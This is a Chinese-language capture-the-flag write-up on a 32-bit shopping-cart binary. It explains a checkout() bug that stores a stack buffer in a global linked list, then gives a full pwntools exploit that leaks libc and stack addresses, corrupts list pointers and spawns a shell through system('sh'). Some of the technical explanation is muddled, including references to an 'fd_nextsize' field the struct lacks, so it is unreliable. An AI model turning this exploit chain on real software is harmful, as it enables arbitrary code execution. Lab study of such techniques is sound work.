# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，程序的执行环境如下：
- **二进制类型**：32位ELF可执行文件，动态链接
- **安全机制**：
  - 栈Canary：启用（位置：`0xffd7898b`）
  - NX保护：启用（不可执行栈）
  - PIE保护：未启用（代码段地址固定）
  - RELRO：Partial RELRO（GOT表可写）
- **依赖库**：标准C库（libc），通过`ldd`确认依赖动态链接库
- **运行环境**：Linux系统，需要终端或模拟环境（如tmux）进行交互式调试
- **内存布局**：
  - 代码段：`0x08048000-0x0804c000`（固定地址）
  - 堆段：`0x0891a000-0x0893b000`（动态分配）
  - 栈段：`0xffd5a000-0xffd7b000`（运行时变化）
- **程序功能**：模拟购物系统，使用双向链表管理购物车，漏洞触发需总价达到7174

## 漏洞成因
### 关键结构体
程序使用双向链表管理购物车，结构体定义如下：
```c
struct cart_item {
    char *name;        // 0x0: 商品名称指针（堆地址）
    int price;         // 0x4: 商品价格
    struct cart_item *next;  // 0x8: 下一个节点指针
    struct cart_item *prev;  // 0xC: 前一个节点指针
    // 注意：实际堆布局中可能存在fd_nextsize字段（0x10）用于大型堆块
};
```
全局变量：
- `myCart`（0x804B06C）：链表尾指针或计数器
- `dword_804B070`（0x804B070）：链表头指针

### 漏洞分析
漏洞位于`checkout()`函数中：
```c
unsigned int checkout() {
  // ...
  if ( v1 == 7174 ) {  // 总价达到7174时触发
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");  // v2为栈局部数组char *v2[5]
    v2[1] = (char *)1;
    insert((int)v2);  // 将栈地址v2插入全局链表
    v1 = 7175;
  }
  // ...
}
```
**漏洞成因**：
1. **栈地址泄露**：`v2`是栈上的局部数组（地址如`0xffd78728`），但通过`insert((int)v2)`将其地址保存到全局链表中。
2. **Use-After-Free**：当`checkout()`函数返回时，栈帧被释放，但全局链表仍持有指向已释放栈内存的指针。
3. **内存破坏**：后续操作（如`cart()`、`delete()`）遍历链表时，会访问失效的栈内存，导致未定义行为。攻击者可利用此泄露的栈地址进行内存覆盖，最终实现代码执行。

**漏洞类型**：Use-After-Free（UAF），具体为栈地址泄露到全局结构。

## 漏洞利用过程
结合exp步进调试，漏洞利用过程如下表所示。关键内存变化围绕堆链表和栈帧的交互：

| 步骤 | exp操作 | 内存关键变化 | 利用效果 |
|------|---------|-------------|----------|
| 1 | `add(4,10); add(1,16); init()` | - 添加10个iPad Mini 3（单价399）和16个iPhone 6（单价199），总价7174<br>- 触发`checkout()`漏洞，栈地址`0xffd78728`泄露到链表节点`0x891a7e0`的`fd_nextsize`字段 | 漏洞触发，栈指针泄露到堆中 |
| 2 | 泄露GOT表`read`地址 | - 通过泄露的栈地址读取GOT条目`read@got`（`0x804b00c`）<br>- 计算libc基址：`libc_base = data - libc.symbols['read']`<br>- 获取`system`和`/bin/sh`地址 | 获取libc关键函数地址，为代码执行做准备 |
| 3 | 泄露堆地址`0x0804B070` | - 读取链表头指针，获取堆地址`heap_addr`<br>- 确认堆布局范围`0x891a000-0x893b000` | 定位堆内存基址，用于后续地址计算 |
| 4 | `get_stack_addr(heap_addr)` | - 遍历链表节点，通过`fd_nextsize`字段链式读取栈地址<br>- 最终获取栈地址`stack_addr`（如`0xffd78728`） | 精确获取栈地址，用于内存覆盖目标 |
| 5 | `delete(payload)`覆盖内存 | - 构造payload：`b'27' + p32(0) + p32(0) + p32(stack_addr+0x20-0xc) + p32(elf.got['asprintf']+0x22)`<br>- 通过删除操作修改链表指针，覆盖栈返回地址或GOT条目 | 将控制流重定向到`system`函数 |
| 6 | 发送`system("sh")` payload | - payload：`b'sh\x00\x00'+p32(system_addr)`<br>- 执行`system("sh")`，启动`/bin/dash` shell | 获得shell权限，进程完全切换 |
| 7 | `p.interactive()` | - 新进程内存布局：<br>  - 代码段：`/bin/dash`（`0x62f3d7200000-0x62f3d7224000`）<br>  - 栈段：`0x7ffef190f000-0x7ffef1930000`<br>- UAF痕迹保留在堆中（如`fd_nextsize`指向栈地址） | 交互式shell运行，利用成功 |

**内存变化总结**：
- **初始状态**：链表全部指向堆地址，无栈泄露。
- **漏洞触发后**：链表节点`0x891a7e0`的`fd_nextsize`字段指向栈地址`0xffd78728`，包含函数指针和返回地址。
- **利用后状态**：进程切换到`/bin/dash`，原程序地址空间不可访问，堆中保留UAF证据。

## Exploit
以下是完整的漏洞利用脚本（exp），在关键位置添加注释说明：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'  # 启用调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 用于终端调试
p = process('./data/sample11')  # 启动目标程序
elf = ELF('./data/sample11')   # 加载ELF文件信息
libc = elf.libc  # 获取libc引用

# 功能函数定义
def add(index, count):
    """添加商品到购物车"""
    for i in range(count):
        p.recvuntil(b'>')
        p.sendline(b'2')  # 选择添加功能
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())

def init():
    """初始化购物车，触发checkout()漏洞"""
    p.recvuntil(b'>')
    p.sendline(b'5')  # 选择结账功能
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')  # 确认结账，触发漏洞条件v1==7174

def leak(payload):
    """利用cart()功能泄露内存地址"""
    p.sendline(b'4')  # 选择查看购物车
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)  # 发送构造的payload
    p.recvuntil(b'27: ')  # 等待特定输出（漏洞节点）
    return u32(p.recv(4))  # 读取4字节地址

def delete(payload):
    """删除购物车项，用于内存覆盖"""
    p.recvuntil(b'>')
    p.sendline(b'3')  # 选择删除功能
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)  # 发送覆盖payload

def get_stack_addr(addr):
    """通过堆地址遍历获取栈地址"""
    for i in range(26):
        payload = b'y\x00' + p32(addr+8) + p32(0) + p32(0) + p32(0)
        addr = leak(payload)  # 链式读取栈地址
    return addr

# 漏洞利用主流程
# Step 1: 触发漏洞 - 添加商品使总价达到7174，泄露栈地址到链表
add(4, 10)  # 添加10个设备4（iPad Mini 3, 单价399）
add(1, 16)  # 添加16个设备1（iPhone 6, 单价199）
init()      # 初始化结账，触发checkout()漏洞

# Step 2: 泄露libc地址 - 通过GOT表读取read地址，计算libc基址
payload = b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)
data = leak(payload)
libc_base = data - libc.symbols['read']  # 计算libc基址
libc.address = libc_base  # 设置libc基址
system_addr = libc.symbols['system']  # 获取system函数地址
bin_sh_addr = next(libc.search(b'/bin/sh'))  # 查找"/bin/sh"字符串地址

# Step 3: 泄露堆地址 - 读取链表头指针
payload = b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)
heap_addr = leak(payload)

# Step 4: 获取栈地址 - 通过堆地址遍历链表获取栈地址
stack_addr = get_stack_addr(heap_addr)

# Step 5: 内存覆盖 - 通过删除操作修改返回地址或GOT条目
# 构造payload：覆盖栈返回地址指向system，同时修改GOT条目
payload = b'27' + p32(0) + p32(0) + p32(stack_addr + 0x20 - 0xc) + p32(elf.got['asprintf'] + 0x22)
delete(payload)

# Step 6: 代码执行 - 发送命令执行system("sh")
payload = b'sh\x00\x00' + p32(system_addr)  # "sh"字符串 + system地址
p.sendline(payload)

# Step 7: 交互模式 - 进入shell
p.interactive()
```

**关键注释说明**：
- **漏洞触发**：通过添加特定商品组合使总价达到7174，触发`checkout()`中的栈地址泄露。
- **地址泄露**：利用UAF读取GOT表获取libc基址，进而计算`system`和`/bin/sh`地址。
- **内存覆盖**：通过删除操作篡改链表指针，覆盖栈返回地址或GOT条目，重定向控制流。
- **代码执行**：最终执行`system("sh")`获得shell权限，进程完全切换到`/bin/dash`。

此exp成功利用UAF漏洞，绕过栈Canary和NX保护，实现了从内存泄露到代码执行的完整利用链。
